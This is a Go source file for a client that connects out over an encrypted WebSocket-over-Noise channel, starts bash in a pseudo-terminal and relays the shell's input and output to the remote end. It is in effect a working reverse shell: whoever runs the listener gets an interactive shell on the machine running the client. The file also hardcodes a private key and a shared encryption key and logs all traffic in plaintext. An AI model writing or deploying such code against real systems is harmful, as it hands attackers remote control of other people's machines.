package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os/exec"
	"strconv"
	"time"
	"websocket"

	"github.com/flynn/noise"
	"github.com/kr/pty"
	"gopkg.in/noisesocket.v0"
)

type CryptoPipe struct {
	key *[32]byte
}

func (p *CryptoPipe) in(r io.Reader, w io.Writer) {
	buffer := make([]byte, 1024)
	for {
		n, err := r.Read(buffer)
		if err != nil {
			panic(err)
		}
		fmt.Println("[in] read... ", buffer[:n], string(buffer[:n]))
		if p.key != nil {
			enc := Encrypt(buffer[:n], *p.key)
			fmt.Println("[in] encrypted... ", enc, string(enc))
			w.Write(enc)
		} else {
			fmt.Println("[io] write... ", string(buffer[:n]))
			w.Write(buffer[:n])
		}

	}
}

func (p *CryptoPipe) out(r io.Reader, w io.Writer) {
	buffer := make([]byte, 1024)
	for {
		n, err := r.Read(buffer)
		if err != nil {
			panic(err)
		}
		fmt.Println("[out] read... ", buffer[:n], string(buffer[:n]))
		if p.key != nil {
			dec := Decrypt(buffer[:n], *p.key)
			fmt.Println("[out] deciphered... ", dec, string(dec))
			w.Write(dec)
		} else {
			fmt.Println("[out] write... ", string(buffer[:n]))
			w.Write(buffer[:n])
		}
	}
}

type rwc struct {
	r io.Reader
	c *websocket.Conn
}

func (c *rwc) Write(p []byte) (int, error) {
	err := c.c.WriteMessage(websocket.TextMessage, p)
	if err != nil {
		return 0, err
	}
	return len(p), nil
}

func (c *rwc) Read(p []byte) (int, error) {
	for {
		if c.r == nil {
			// Advance to next message.
			var err error
			_, c.r, err = c.c.NextReader()
			if err != nil {
				return 0, err
			}
		}
		n, err := c.r.Read(p)
		if err == io.EOF {
			// At end of message.
			c.r = nil
			if n > 0 {
				return n, nil
			} else {
				// No data read, continue to next message.
				continue
			}
		}
		return n, err
	}
}

func (c *rwc) Close() error {
	return c.c.Close()
}

// CreateDedicatedChannel creates the secure channel using noise protocol framework
func CreateDedicatedChannel(address string, port int32) {
	pub1, _ := base64.StdEncoding.DecodeString("L9Xm5qy17ZZ6rBMd1Dsn5iZOyS7vUVhYK+zby1nJPEE=")
	priv1, _ := base64.StdEncoding.DecodeString("TPmwb3vTEgrA3oq6PoGEzH5hT91IDXGC9qEMc8ksRiw=")

	fmt.Println("client ss.pub", pub1)
	fmt.Println("client ss.priv", priv1)

	// Diffie Hellman pair keys
	clientKeys := noise.DHKey{
		Public:  pub1,
		Private: priv1,
	}

	u := url.URL{Scheme: "ws", Host: address + ":" + strconv.FormatInt(int64(port), 10), Path: "/ws"}
	log.Printf("connecting to %s", u.String())

	// Websockets wrap a noise socket connection
	d := &websocket.Dialer{
		Proxy:            http.ProxyFromEnvironment,
		HandshakeTimeout: 45 * time.Second,
		NetDial: func(network, addr string) (net.Conn, error) {
			conn, err := noisesocket.Dial(addr, &noisesocket.ConnectionConfig{StaticKey: clientKeys})
			if err != nil {
				fmt.Println("Dial", err)
			}
			return conn, err
		},
	}
	c, _, err := d.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	done := make(chan struct{})

	go func() {
		defer close(done)

		cmd := exec.Command("bash")
		f, _ := pty.Start(cmd)

		wc := &rwc{c: c}
		p := &CryptoPipe{}
		if encrypted {
			p = &CryptoPipe{key: &sharedKey}
		}
		go p.in(f, wc)
		p.out(wc, f)
	}()
	for {
		select {
		case <-done:
			return
		}
	}
}

var encrypted = false
var sharedKey = [32]byte{16, 44, 122, 53, 10, 77, 214, 164, 220, 19, 151, 64, 250, 13, 191, 5, 61, 6, 88, 138, 89, 1, 190, 18, 119, 176, 132, 39, 227, 233, 73, 35}

func main() {
	if !encrypted {
		log.Println("*******************************************\nENCRYPTED IS DISABLED\n*******************************************")
	}
	CreateDedicatedChannel("localhost", 8100)
}
